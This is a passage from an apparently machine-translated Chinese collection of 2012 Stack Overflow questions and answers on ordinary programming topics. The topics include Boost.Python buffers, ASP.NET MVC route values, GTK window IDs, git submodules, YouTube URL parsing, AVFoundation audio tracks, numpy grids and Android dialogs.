> 
> 时间：2012-05-01T21:59:42.383

Python 并不真正处理指针。您可以将其导出为不透明的 cookie，但您永远不能对它**做**任何事情（除非将其传回 c++）。

在你的情况下，我会做的是扭转它。与其返回指向 python 的指针，不如在 c++ 中使用一个从 python 获取“缓冲区”的函数。

```
namespace bp = boost::python
void FillBuffer(Foo& this, bp::list buff)
{
    unsigned char* addr = reinterpret_cast< unsigned char* >( this.GetAddress() );
    for(int i = 0; i < bp::len(buff); i++)
        addr[i] = bp::extract< unsigned char >( buff[i] );
}

Foo_exposer.def("FillBuffer", &FillBuffer); 
```

现在您可以传入一个列表**来**填充缓冲区。您可以创建一个类似的函数来将缓冲区填充到列表中并将其返回 python。当然，您会希望对缓冲区溢出等问题更加小心，但这应该给您正确的想法。

# c# - 在 MVC 表单回发中保留路由详细信息

> ID：10403306
> 
> 赞同：0
> 
> 时间：2012-05-01T19:44:05.860
> 
> 标签：c#, asp.net-mvc, razor

我有一个基本的 MVC 表单，可以通过**GET** Action 访问，其中包含从路由中提取的 3 个字符串参数。

```
[HttpGet]
public ActionResult Application(string x, string y, string z)
{
    //create model, setup form, etc...

    return View(model);
} 
```

访问该表单的路由配置如下：

```
routes.MapRoute("Application", 
    "application/{x}/{y}/{z}",
    new
    {
        controller = "Application",
        action = "Application",
        x = "",
        y = "",
        z = ""
    }); 
```

并且表单配置如下：

```
Html.BeginForm("Application", "Application", FormMethod.Post) 
```

在我单击结果表单上的提交之前，所有这些都有效。从路由的角度来看，正确的 POST Action 被调用并且模型被正确绑定。问题是我丢失了我仍然需要的所有**x/y/z路线信息。****如何保存路线信息？**

我尝试了几件事：

*   在隐藏字段中的表单中添加了路由详细信息，这些字段正确添加到表单内容中，但在回发时不会在模型中返回
*   尝试使用**Html.BeginForm的****RouteValueDictionary**重载，但无法弄清楚如何使其工作。我可能只需要一个正确的例子来说明如何使用它以及如何从控制器访问状态

 **## 更新：这添加了**查看**示例以帮助解决有关使用隐藏字段的评论

```
@using (Html.BeginForm("Application", "Application", FormMethod.Post, new
                                                                        {
                                                                            autocomplete = "on", 
                                                                            id = "LoanApplication", 
                                                                            novalidate = string.Empty, 
                                                                            name = "Application"
                                                                        }))
{
    <fieldset>
        @Html.HiddenFor(m => m.x)
        @Html.HiddenFor(m => m.y)
        @Html.HiddenFor(m => m.z)
        @Html.HiddenFor(m => m.DigiCertId)
        <br />
        <input id="SubmitButton" type="submit" value="@Resources.SubmitApplicationButton" title="@Resources.SubmitApplicationButtonDescription" />
    </fieldset>
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T19:52:04.737

您应该真正将这些属性放入模型中，然后`HiddenFor`为每个属性设置一个，如下所示：

```
@Html.HiddenFor(m => m.x)
@Html.HiddenFor(m => m.y)
@Html.HiddenFor(m => m.z) 
```

然后在您的 post 方法中（假设它是这样的），您可以将它们传递`RouteValueDictionary`给`Get`Method，如下所示：

```
[HttpPost]
public ActionResult Application(MyModel model) //whatever type your model is
{
    //do whatever your post method does before redirect
    return RedirectToAction("Application", new { x = model.x, y = model.y, z = model.z});
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:57:12.960

除了mattytommo建议的ans。我建议`TempData`在 asp.net MVC 中使用集合。这会使用会话存储来保存数据，但会临时保存数据，一旦您访问它，数据就会被删除。
这是专门为这些目的而存在的，
因此您可以将数据保存在 TempData 中，`TempData["Values"] = new {X=x,Y=y,Z=z};` 然后`TempData["Values"]`在发布后访问**

# c - 如何获取 Gtk2 GtkDrawingArea 的 XID 以嵌入 Mplayer

> ID：10403316
> 
> 赞同：2
> 
> 时间：2012-05-01T19:44:48.270
> 
> 标签：c, embed, gtk2, gdk

我正在编写一个 Gtk2 应用程序，其中需要将`Mplayer`视频播放到`GtkDrawingArea`. 据我所知，如果可以找到 XID`GtkDrawingArea`并将其作为参数传递给 Mplayer，这是可能的。但是，我正在使用下面的代码片段。

```
long videoID;                 
GtkWidget *videoWindow = NULL;

/* need be done only once on Namb2Client startup */
InitEGM( &egm );    

/* Init GTK+ */
gtk_init( &argc, &argv );

/* Create new GtkBuilder object */
builder = gtk_builder_new();

/* Load UI from file. If error occurs, report it and quit application. */
if( !gtk_builder_add_from_file( builder, "layout.xml", &error ) )
{
    g_warning( "%s", error->message );
    g_free( error );
    return( 1 );
}

/* Get main window pointer from UI */
window = GTK_WIDGET( gtk_builder_get_object( builder, "window1" ) );
gtk_window_position(GTK_WINDOW(window), (GtkWindowPosition)GTK_WIN_POS_CENTER);

MainWnd = GTK_WIDGET( gtk_builder_get_object( builder, "MainWnd" ) );

// Setup area for Mplayer video
videoWindow = gtk_drawing_area_new ();
gtk_widget_set_size_request (videoWindow, 640, 180);
gtk_fixed_put((GtkFixed *)MainWnd, videoWindow, 414, 24 );
gtk_widget_show( videoWindow );    
videoID = gdk_x11_drawable_get_xid( videoWindow );
g_printf("XID = %ld\n", videoID); 
```

当我运行应用程序时，我收到以下错误：

```
(egm:3872): Gdk-WARNING **: gdkdrawable-x11.c:952 drawable is not a pixmap or window
XID = 0 
```

获取 a 的 XID 的正确方法是`GtkDrawingArea`什么？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:59:01.683

发现了问题。我需要确保打电话`gtk_widget_realize()`。如果不这样做，小部件就没有完全创建，也没有分配一个 X11 XID。

```
// Setup area for Mplayer video
videoWindow = gtk_drawing_area_new ();
gtk_widget_set_size_request (videoWindow, 640, 180);
gtk_fixed_put((GtkFixed *)MainWnd, videoWindow, 414, 24 );
gtk_widget_realize( videoWindow );
gtk_widget_show( videoWindow );    
videoID = GDK_WINDOW_XWINDOW (GTK_WIDGET (videoWindow)->window);
g_printf("XID = %ld\n", videoID); 
```

# flash - 从 Flash Web 应用程序中抓取数据

> ID：10403324
> 
> 赞同：0
> 
> 时间：2012-05-01T19:45:38.370
> 
> 标签：flash, screen-scraping, data-mining

有问题的应用程序是 FIFA Ultimate Team 网络应用程序，位于：

[http://www.ea.com/uk/football/fifa-ultimate-team](http://www.ea.com/uk/football/fifa-ultimate-team)

它本质上是一个玩家出售/交易卡牌的实时市场。我希望从此应用程序中记录诸如卡片价格等数据，但我真的不知道从哪里开始。

[http://www.ultimatedb.nl](http://www.ultimatedb.nl)上有一个网站成功地实现了这一点，所以我知道这是可能的，但我发现试图弄清楚这一点有点令人沮丧。

有没有人有一个好的起点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T07:02:06.123

打开 chrome 开发者工具区域的网络选项卡，查看电影发出的请求。如果它是 xml，那么您很幸运，应该很容易伪造正确的请求并解析响应。它可能是 amf 格式，这是一种特定于 flash 的格式。在这种情况下，你必须希望你能找到一个好的库来解析你正在使用的语言的 amf。

# c# - 从您的配置文件控制 CacheItemPolicy 属性 - 有可能吗？

> ID：10403325
> 
> 赞同：3
> 
> 时间：2012-05-01T19:45:38.607
> 
> 标签：c#, .net, vb.net, caching, .net-4.0

参考 .NET 4.0 中的 System.Runtime.Caching 类，似乎可以只在配置文件中设置有限数量的东西：

*   姓名
*   轮询间隔
*   该缓存允许使用的内存量
*   在缓存被清除之前需要命中的内存百分比

示例部分如下所示：

```
 <system.runtime.caching>
    <memoryCache>
      <namedCaches>
        <add name="NameOfMyCache" pollingInterval="00:05:00" cacheMemoryLimitMegabytes="0" physicalMemoryLimitPercentage="0"/>
      </namedCaches>
    </memoryCache>
  </system.runtime.caching> 
```

但是，似乎没有一个真正有用的项目（恕我直言！）可以从配置文件中控制。这些是 CacheItemPolicy 类中的所有选项，例如 AbsoluteExpiration、SlidingExpiration 和 Priority（我可以理解如何不公开回调函数，尽管我希望看到一些选项，以了解在调用这些函数时该怎么做)

问题是，是否可以从配置文件中执行此操作而无需离开并滚动您自己的自定义部分？

# git - Git子模块没有更新？

> ID：10403328
> 
> 赞同：1
> 
> 时间：2012-05-01T19:45:55.873
> 
> 标签：git

我有一个项目，其中包含一些库作为子模块。它们在您添加它们的机器上运行良好，但是当我回到家并检查存储库时，我得到了子模块的文件夹，但它们是空的。

**.gitmodules**

```
Neon@Neon-PC /cygdrive/c/xampp/htdocs/learning-lithium
$ cat .gitmodules
[submodule "libraries/lithium"]
        path = libraries/lithium
        url = git://github.com/UnionOfRAD/lithium.git
[submodule "app/webroot/css/elements"]
        path = app/webroot/css/elements
        url = https://github.com/dmitryf/elements.git
[submodule "app/libraries/li3_markdown"]
        path = app/libraries/li3_markdown
        url = https://github.com/sandelius/li3_markdown.git
[submodule "app/webroot/markitup"]
        path = app/webroot/markitup
        url = https://github.com/markitup/1.x.git 
```

**配置和状态命令**

```
Neon@Neon-PC /cygdrive/c/xampp/htdocs/learning-lithium
$ git submodule
-af14f48b419310935446176290e1f9dc641400e0 app/libraries/li3_markdown
-ebdcd8ca09c874f5e2ef81ec198cc441f37a4f74 app/webroot/css/elements
-328291e49a3c7e1fb76b3342f112734864836205 app/webroot/markitup
-4980010526d05c556c496ff63951da31828c5943 libraries/lithium

Neon@Neon-PC /cygdrive/c/xampp/htdocs/learning-lithium
$ git submodule update

Neon@Neon-PC /cygdrive/c/xampp/htdocs/learning-lithium
$ git submodule status
-af14f48b419310935446176290e1f9dc641400e0 app/libraries/li3_markdown
-ebdcd8ca09c874f5e2ef81ec198cc441f37a4f74 app/webroot/css/elements
-328291e49a3c7e1fb76b3342f112734864836205 app/webroot/markitup
-4980010526d05c556c496ff63951da31828c5943 libraries/lithium 
```

我像往常一样添加了这些，
`git submodule add <repo> <path>`
`git submodule init`

子模块托管在 Github 上，我的 repo 托管在 Bitbucket 上，尽管我不确定这是否相关。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:59:58.067

尝试使用 --recursive 选项进行克隆。

# php - 解析 url 以摆脱第一个之后的所有参数

> ID：10403333
> 
> 赞同：0
> 
> 时间：2012-05-01T19:46:12.227
> 
> 标签：php, parsing, youtube

据我了解，youtube.com 的视频链接使用了三种类型的网址。

```
http://www.youtube.com/watch?v=8uLPtmCroQ8&feature=related
http://www.youtube.com/watch?v=8uLPtmCroQ8
http://youtu.be/8uLPtmCroQ8 
```

我以这些不同方式中的任何一种将这个 url 提交到我的站点，并将该 url 存储到一个名为`$video_code`. 我需要删除视频 id 之后的任何参数，因此如果用户提交上面的第一个 url，`&feature=related`就会被删除。我正在使用 php。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T20:42:04.527

如果我正确理解您的问题，您可以使用类似的方法将视频 id 存储在数据库中，然后根据需要构建 url。

```
function getVideoId($url)
{
    $parsedUrl = parse_url($url);
    if ($parsedUrl === false)
        return false;

    if (!empty($parsedUrl['query']))
    {
        $query = array();
        parse_str($parsedUrl['query'], $query);
        if (!empty($query['v']))
            return $query['v'];
    }

    if (in_array(strtolower($parsedUrl['host']), array('youtu.be', 'www.youtu.be')))
        return trim($parsedUrl['path'], '/');

    return false;
}

$input = array('http://www.youtube.com/watch?v=8uLPtmCroQ8&feature=related', 'http://www.youtube.com/watch?v=8uLPtmCroQ8', 'http://youtu.be/8uLPtmCroQ8');

foreach ($input as $url)
{
    echo getVideoId($url) . PHP_EOL;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T19:49:27.657

你想用哪种语言来做这个？如果它是在 PHP 中，你应该看看[这个](http://php.net/manual/en/function.parse-url.php)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-01T19:58:11.880

您还可以执行正则表达式来拆分字符串。看看这里：[http ://www.php.net/manual/en/function.preg-split.php](http://www.php.net/manual/en/function.preg-split.php)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-01T20:46:52.943

使用此代码：

```
$arr=array(
'http://www.youtube.com/watch?v=8uLPtmCroQ8&feature=related',
'http://www.youtube.com/watch?v=8uLPtmCroQ8',
'http://youtu.be/8uLPtmCroQ8',
);
for($i=0; $i<count($arr); $i++){
   $urlarr = parse_url($arr[$i]);
   if (!empty($urlarr['query'])) {
      parse_str($urlarr['query']);
      $qarr = array();
      if (!empty($v))
         $qarr['v'] = $v;
      $urlarr['query'] = http_build_query($qarr);
      $arr[$i] = http_build_url('', $urlarr);
   }
}
print_r($arr); 
```

### 输出：

```
Array
(
    [0] => http://www.youtube.com/watch?v=8uLPtmCroQ8
    [1] => http://www.youtube.com/watch?v=8uLPtmCroQ8
    [2] => http://youtu.be/8uLPtmCroQ8
) 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-02T20:35:42.620

```
function getVideoCode($url){
$videoCode;
$code_parse = parse_url($url);
if(empty($code_parse["query"])){
    $videoCode = str_replace("/"," ",$code_parse["path"]);
}else{
    $videoCode = clearQuery($code_parse["query"]);
}
echo $videoCode;
}
function clearQuery($query){
$redundant = array("v", "&", "feature","=","related"); 
return str_replace($redundant," ",$query);
} 
```

这不是专业代码，但很容易理解。当我这样调用时：

```
getVideoCode("http://youtu.be/8uLPtmCroQ8");
getVideoCode("http://www.youtube.com/watch?v=8uLPtmCroQ8");
getVideoCode("http://www.youtube.com/watch?v=8uLPtmCroQ8&feature=related"); 
```

输出是

*   **8uLPtmCroQ8**
*   **8uLPtmCroQ8**
*   **8uLPtmCroQ8**

# ios - AVAssetExportSession 创建电影成功，但持续时间关闭

> ID：10403334
> 
> 赞同：1
> 
> 时间：2012-05-01T19:46:12.367
> 
> 标签：ios, avfoundation

我一直在尝试将视频与背景音频结合起来。我能够创建一个包含 1 个视频和 1 个音频文件的视频（谢天谢地，我在 SO 上找到了），但我很难将其扩展为使用 2 个或更多音频文件。背景音频可以来自多个文件，我想将它们按顺序添加到视频中。

前任。audio-1.caf 为 2 秒，audio-2.caf 为 2 秒，video-1.mov 为 4 秒。

我希望音频 1 的时间间隔为 0-2 秒，音频 2 的时间间隔为 2-4 秒。不幸的是，我创建的代码使用第一个音频 1 创建了一个 2 秒的电影，其余的电影和音频不包括在内。

我简化了问题，所以我可以在这里寻求帮助。下面的代码尝试创建具有 2 个音频源的空白视频。（我之前的实现是动态的，并且循环通过所有音频源）

```
-(void)writeAudio
{
  AVMutableComposition* mixComposition = [AVMutableComposition composition];

  NSDictionary * assetOptions = [NSDictionary dictionaryWithObject:[NSNumber numberWithBool:YES] forKey:AVURLAssetPreferPreciseDurationAndTimingKey];

  NSString * outputFilePath = NSHomeDirectory();
  outputFilePath = [outputFilePath stringByAppendingPathComponent:@"Library"];
  outputFilePath = [outputFilePath stringByAppendingPathComponent:@"temp.mov"];
  NSURL * outputFileUrl = [NSURL fileURLWithPath:outputFilePath];
  [[NSFileManager defaultManager] removeItemAtURL:outputFileUrl error:nil];

  CMTime nextClipStartTime = kCMTimeZero;
  NSURL * audioURL /* = kSomeValidURL */;
  NSURL * audio2URL /* = kSomeOtherValidURL */;

  AVURLAsset* audioAsset = [[AVURLAsset alloc] initWithURL:audioURL options:assetOptions];
  CMTimeRange audio_timeRange = CMTimeRangeMake(nextClipStartTime, audioAsset.duration);
  AVMutableCompositionTrack *b_compositionAudioTrack = [mixComposition addMutableTrackWithMediaType:AVMediaTypeAudio preferredTrackID:kCMPersistentTrackID_Invalid];
  [b_compositionAudioTrack insertTimeRange:audio_timeRange ofTrack:[[audioAsset tracksWithMediaType:AVMediaTypeAudio] objectAtIndex:0] atTime:nextClipStartTime error:nil];
  nextClipStartTime = CMTimeAdd(nextClipStartTime, audio_timeRange.duration);

  AVURLAsset* audio2Asset = [[AVURLAsset alloc] initWithURL:audio2URL options:assetOptions];
  CMTimeRange audio2_timeRange = CMTimeRangeMake(nextClipStartTime, audio2Asset.duration);
  AVMutableCompositionTrack *b_compositionAudio2Track = [mixComposition addMutableTrackWithMediaType:AVMediaTypeAudio preferredTrackID:kCMPersistentTrackID_Invalid];
  [b_compositionAudio2Track insertTimeRange:audio2_timeRange ofTrack:[[audio2Asset tracksWithMediaType:AVMediaTypeAudio] objectAtIndex:0] atTime:nextClipStartTime error:nil];
  nextClipStartTime = CMTimeAdd(nextClipStartTime, audio2_timeRange.duration);

  AVAssetExportSession* _assetExport = [[AVAssetExportSession alloc] initWithAsset:mixComposition presetName:AVAssetExportPresetHighestQuality];   
  _assetExport.outputFileType = @"com.apple.quicktime-movie";
  _assetExport.outputURL = outputFileUrl;
  [_assetExport exportAsynchronouslyWithCompletionHandler:
   ^(void ) {
     NSLog(@"audio was completed???");
   }       
   ];

} 
```

问题仍然存在，新视频由第一个 audioURL 的内容组成，并且是第一个 audioURL 内容的持续时间。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:27:14.187

我的问题源于不完全了解 AVFoundation（我仍然不了解）。

我的时间间隔，仍然需要从 0 开始并持续音频资产的持续时间，然后在我希望它们开始的时间插入。

我更改了初始化 audio_timeRanges 的代码。

从

```
CMTimeRange audio_timeRange = CMTimeRangeMake(nextClipStartTime, audioAsset.duration); 
```

至

```
CMTimeRange audio_timeRange = CMTimeRangeMake(kCMTimeZero, audioAsset.duration); 
```

和从

```
CMTimeRange audio2_timeRange = CMTimeRangeMake(nextClipStartTime, audio2Asset.duration); 
```

至

```
CMTimeRange audio2_timeRange = CMTimeRangeMake(kCMTimeZero, audio2Asset.duration); 
```

# forms - 表单提交名称获取值

> ID：10403339
> 
> 赞同：0
> 
> 时间：2012-05-01T19:46:52.630
> 
> 标签：forms, submit

我有一个表单，并使用了一个没有如下名称的普通提交按钮。

```
 <input type="submit" value="Submit" /> 
```

一切正常。我的问题是有一种方法可以给它起一个名字，比如下面这样的随机数。

```
 <input type="submit" name="R312321321" value="Submit" /> 
```

然后，当我提交时，我可以获得提交按钮名称的值，就像它是隐藏输入一样。我不能为我正在做的事情使用隐藏的输入。我想以这种方式执行提交按钮的原因是浏览器宏查找名称。如果名称总是在变化，那么他们的宏就更难工作了。一旦我获得提交按钮的值，我就可以对其进行身份验证，我已经创建了一些东西，只需要在 php.ini 中获取提交的值。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:55:14.563

是的，这会奏效。但是，规范对以数字开头的输入名称另有说明。

> ID 和 NAME 标记必须以字母 ([A-Za-z]) 开头，后跟任意数量的字母、数字 ([0-9])、连字符 ("-")、下划线 ("_") , 冒号 (":") 和句点 (".")。

提交表单后，您将拥有一个键值对

```
[312321321] => Submit 
```

# python - Nx3 列数据到 2d 矩阵用于图像处理

> ID：10403341
> 
> 赞同：1
> 
> 时间：2012-05-01T19:46:59.290
> 
> 标签：python, image-processing, numpy, scikits

我试图在我从文本文件中读取的格式（'x'，'y'，'value'）的 Nx3 数据中找到局部最大值和计数；'x' 和 'y' 形成一个均匀间隔的网格，'x','y' 的每个组合都有一个值，它看起来像这样：

```
 3.0, -0.4, 56.94369888305664        
  3.0, -0.3, 56.97200012207031        
  3.0, -0.2, 56.77149963378906        
  3.0, -0.1, 56.41230010986328        
  3.0,  0,   55.8302001953125       
  3.0,  0.1, 55.81560134887695        
  3.0,  0.2, 55.600399017333984        
  3.0,  0.3, 55.51969909667969        
  3.0,  0.4, 55.18550109863281         
  3.2, -0.4, 56.26380157470703 
  3.2, -0.3, 56.228599548339844
  ... 
```

问题是我尝试使用的图像代码（[链接](http://scikits-image.org/docs/dev/auto_examples/plot_contours.html)）要求数据采用不同的二维矩阵格式进行图像处理。这是代码的相关部分：

```
# Construct some test data
x, y = np.ogrid[-np.pi:np.pi:100j, -np.pi:np.pi:100j]
r = np.sin(np.exp((np.sin(x)**3 + np.cos(y)**2)))

# Find contours at a constant value of 0.8
contours = measure.find_contours(r, 0.8) 
```

有人可以帮助将我的数据转换为所需的“网格”格式吗？

**编辑：**我终于选择了熊猫，但在一般情况下我发现选择的答案更好。这就是我所做的：

```
from pandas import read_csv
data=read_csv(filename, names=['x','y','values']).pivot(index='x', columns='y',
              values='values') 
```

在此之后`data.values`以我想要的二维“图像形式”保持表格。

```
y   -0.4        -0.3        -0.2        -0.1
x               
3.0  86.9423     87.6398     87.5256     89.5779
3.2  76.9414     77.7743     78.8633     76.8955
3.4  71.4146     72.8257     71.7210     71.5232 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-02T12:45:53.757

最好的解决方案实际上取决于您不提供的细节。顺便说一句，你**真的**应该给出你的代码，或者至少给出 np.loadtxt 指令。在下文中，“数据”是使用以下文件从文件加载的数组：

```
data = np.loadtxt('file.txt', [('x',float), ('y',float), ('value',float)]) 
```

## 1）直接重塑：

*按照@tom10 所说*
的如果您知道您的 (x,y,value) 数据以特定顺序存储：

```
[(x0,y0,v00), (x0,y1,v01), .... , (x1,y0,v10),(x1,y1,v11), ... ,(xN,yM,vNM)] 
```

并且给出了所有 (x,y) 对的值。那么最好的办法是从你的值列表中创建一个 1D numpy 数组并重塑它：

```
x = np.unique(data['x'])
y = np.unique(data['y'])
r = data['value'].reshape((x.size,y.size)) 
```

## 2) 一般情况：

*请参阅[在 python (numpy) 中填充数组？](https://stackoverflow.com/questions/6150375/populate-arrays-in-python-numpy)对于类似的问题和使用字典的其他解决方案*

如果您不能保证除了 (x,y,value) 元组之外的任何其他内容：

```
# indexing: list of x and y coordinates, and functions that map them to index
x  = np.unique(data['x']).tolist()
y  = np.unique(data['y']).tolist()
ix = np.vectorize(lambda i: x.index(i), otypes='i')
iy = np.vectorize(lambda j: y.index(j), otypes='i')

# create output array
r  = np.zeros((x.size,y.size), float)   # default value is 0
r[ix(data['x']), iy(data['y'])] = data['value'] 
```

**注意：**在上面给出的参考资料中，给出了另一种使用字典的方法。我认为这更具可读性，但我没有测试它们的相对速度。

## 3) 中间案例？

您可能有一个中间情况，在以特定顺序给出的常规网格坐标和根本没有约束之间。一般情况可能非常慢，您应该设计您的算法以利用您的数据遵循的任何规则。

一个例子是，如果您知道 xy 索引遵循特定规则，但不一定按顺序给出。例如，如果您知道 x 和 y 是等距的“网格”坐标，其形式为：

```
coordinate = min_coordinate + i*step 
```

然后找到**min_coordinate**和**step**（对于 x 和 y），并通过求解这个方程找到**i 。**这样，您可以避免昂贵的索引映射*np.vectorized(... list.index(...))*：

```
x  = np.unique(data['x'])
y  = np.unique(data['y'])
ix = (data['x']-x.min())/(x[1]-x[0])
iy = (data['y']-y.min())/(y[1]-y[0])

# create output array
r  = np.ones((x.size,y.size), float)*np.nan   # default value is NaN
r[ix.astype(int), iy.astype(int)] = data['value'] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-01T20:49:32.973

对于您正在使用的程序，您只需要数据是`z`值的矩形数组（在他们给出的示例中，他们只使用 x 和 y 来构造 z，但不再使用它们）。看起来你有 9 x N 的数组（其中 N 是你没有显示的东西）。一种简单的方法是将数据作为 z 值的平面集合读取，跳过 x,y 值，`reshape`以设置您想要的形状。（我真的无法为此编写代码，因为您没有提供足够的信息，但这应该不难。）

# iphone - 如何从我的应用程序切换到设置？

> ID：10403344
> 
> 赞同：0
> 
> 时间：2012-05-01T19:47:16.657
> 
> 标签：iphone, cocoa-touch, ipad

> **可能重复：**
> [从另一个应用程序打开设置应用程序](https://stackoverflow.com/questions/5655674/opening-the-settings-app-from-another-app)

如果他拒绝使用他的本地化，我想将我的用户切换到设置应用程序。我正在使用警报视图来做到这一点

* * *

## 回答 #1

> 赞同：-2
> 
> 时间：2012-05-01T19:52:01.860

使用这一行：

```
[[UIApplication sharedApplication] openURL:[NSURL URLWithString:@"prefs:root=General"]] 
```

有关更多详细信息，请参阅[此问题](https://stackoverflow.com/questions/4496813/call-the-official-settings-app-from-my-app-on-iphone)。

编辑：正如 Reed 在评论中所写，这在 iOS 5.1 中是不可能的。

# facebook - 如何在多个博客文章中添加 facebook，就像您在 wordpress 中的索引文件一样？

> ID：10403349
> 
> 赞同：0
> 
> 时间：2012-05-01T19:47:58.957
> 
> 标签：facebook, facebook-like

我想在我的 wordpress 博客中实现或添加一个类似 facebook 的按钮。但这一次，我希望它出现在我的索引文件或多篇博文中。问题是当我复制粘贴 facebook 为我生成的内容时，它只是“喜欢”我的域名或我的索引文件，而不是应该被喜欢的博客文章。

我应该怎么做才能正确添加 facebook like 按钮才能工作？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T19:58:50.540

其实很简单。您仍然需要 Facebook Like 按钮的代码，但您必须修改它。将 url 中的值添加`<?php the_permalink(); ?>`为喜欢，就是这样。

只需确保您拥有正确的元标记，例如标题和描述，这样 facebook 就可以成功抓取您的博文。

# android - Android 自定义对话框

> ID：10403352
> 
> 赞同：1
> 
> 时间：2012-05-01T19:48:08.110
> 
> 标签：android, android-layout, photoshop

嗨，我想为我的 android 应用程序制作一个自定义对话框，并希望用按钮、复选框和此类项目填充它。我已经按照android开发者网站的教程进行操作，但这不是我想要的，实际上我想自定义对话框的背景和大小。请如果任何人可以给我一个先机，另外我想知道当我为那个盒子设计背景时，我使用什么尺寸和像素数，以便它可以在 Galaxy Note、Galaxy S 和平板电脑和其他手机上运行相同运行安卓的手机。这是自定义对话框的图片。就像那样，我想解决一些问题。![在此处输入图像描述](../Images/40cb003e8ceed25b7108563e4e3d92ed.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T19:54:16.890

是的，这是一个很好的问题。您必须使用具有透明背景主题的自定义对话框，如下所示：

```
Dialog dialog = new Dialog(mContext, android.R.style.Theme_Translucent_NoTitleBar);

dialog.setContentView(R.layout.custom_dialog);
dialog.show(); 
```

对话框布局的 XML 将在哪里`custom_dialog`，就尺寸而言，您应该在许多不同的屏幕分辨率设备上真正测试您的应用程序，以确保它按您的意愿显示。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T21:04:27.787

有时我想创建一个完全自定义的对话框，例如您展示的那个。

当我不得不这样做时，我努力了一段时间，试图让它成为一个对话。最后，我发现将我的对话框包装在它自己的活动中要容易得多，在清单中将其设置为主题透明，并使布局 xml 文件在边缘周围有透明空间。这是我摆脱所有默认对话框格式的最简单方法（即，如果您使用 setContentView() 路线执行此操作，则它进入的框架）

因此，虽然从技术上讲，它不再是一个对话，但对用户来说，它具有相同的目的。

# android - Android Eclipse 图形布局问题

> ID：10403354
> 
> 赞同：0
> 
> 时间：2012-05-01T19:48:19.260
> 
> 标签：android, xml, eclipse, android-webview, android-custom-view

我正在开发一个已经构建的 android 应用程序，并且我正在添加一个功能。在应用程序中，我们使用了一个 webview 的子类。当我尝试使用图形布局编辑器时，我收到一条错误消息

```
com.android.layoutlib.bridge.MockView cannot be cast to android.view.ViewGroup
Exception details are logged in Window > Show View > Error Log
The following classes could not be instantiated:
- com.my.web.view.WebView (Open Class, Show Error Log)
See the Error Log (Window > Show View) for more details.
Tip: Use View.isInEditMode() in your custom views to skip code when shown in Eclipse 
```

这是错误日志中的内容

```
java.lang.ClassCastException: com.android.layoutlib.bridge.MockView cannot be cast to android.view.ViewGroup
at android.view.LayoutInflater.rInflate(LayoutInflater.java:624)
at android.view.LayoutInflater.rInflate(LayoutInflater.java:626)
at android.view.LayoutInflater.inflate(LayoutInflater.java:408)
at android.view.LayoutInflater.inflate(LayoutInflater.java:296)
at com.android.layoutlib.bridge.impl.RenderSessionImpl.inflate(RenderSessionImpl.java:279)
at com.android.layoutlib.bridge.Bridge.createSession(Bridge.java:318)
at com.android.ide.common.rendering.LayoutLibrary.createSession(LayoutLibrary.java:325)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.RenderService.createRenderSession(RenderService.java:372)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.renderWithBridge(GraphicalEditorPart.java:1361)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.recomputeLayout(GraphicalEditorPart.java:1115)
at com.android.ide.eclipse.adt.internal.editors.layout.gle2.GraphicalEditorPart.activated(GraphicalEditorPart.java:941)
at com.android.ide.eclipse.adt.internal.editors.layout.LayoutEditorDelegate.delegatePageChange(LayoutEditorDelegate.java:450)
at com.android.ide.eclipse.adt.internal.editors.common.CommonXmlEditor.pageChange(CommonXmlEditor.java:358)
at org.eclipse.ui.part.MultiPageEditorPart.setActivePage(MultiPageEditorPart.java:1067)
at org.eclipse.ui.forms.editor.FormEditor.setActivePage(FormEditor.java:607)
at com.android.ide.eclipse.adt.internal.editors.AndroidXmlEditor.selectDefaultPage(AndroidXmlEditor.java:380)
at com.android.ide.eclipse.adt.internal.editors.AndroidXmlEditor.addPages(AndroidXmlEditor.java:285)
at com.android.ide.eclipse.adt.internal.editors.common.CommonXmlEditor.addPages(CommonXmlEditor.java:283)
at org.eclipse.ui.forms.editor.FormEditor.createPages(FormEditor.java:138)
at org.eclipse.ui.part.MultiPageEditorPart.createPartControl(MultiPageEditorPart.java:348)
at org.eclipse.ui.internal.EditorReference.createPartHelper(EditorReference.java:670)
at org.eclipse.ui.internal.EditorReference.createPart(EditorReference.java:465)
at org.eclipse.ui.internal.WorkbenchPartReference.getPart(WorkbenchPartReference.java:595)
at org.eclipse.ui.internal.EditorReference.getEditor(EditorReference.java:289)
at org.eclipse.ui.internal.WorkbenchPage.busyOpenEditorBatched(WorkbenchPage.java:2863)
at org.eclipse.ui.internal.WorkbenchPage.busyOpenEditor(WorkbenchPage.java:2768)
at org.eclipse.ui.internal.WorkbenchPage.access$11(WorkbenchPage.java:2760)
at org.eclipse.ui.internal.WorkbenchPage$10.run(WorkbenchPage.java:2711)
at org.eclipse.swt.custom.BusyIndicator.showWhile(BusyIndicator.java:70)
at org.eclipse.ui.internal.WorkbenchPage.openEditor(WorkbenchPage.java:2707)
at org.eclipse.ui.internal.WorkbenchPage.openEditor(WorkbenchPage.java:2691)
at org.eclipse.ui.internal.WorkbenchPage.openEditor(WorkbenchPage.java:2682)
at org.eclipse.ui.ide.IDE.openEditor(IDE.java:651)
at org.eclipse.ui.ide.IDE.openEditor(IDE.java:610)
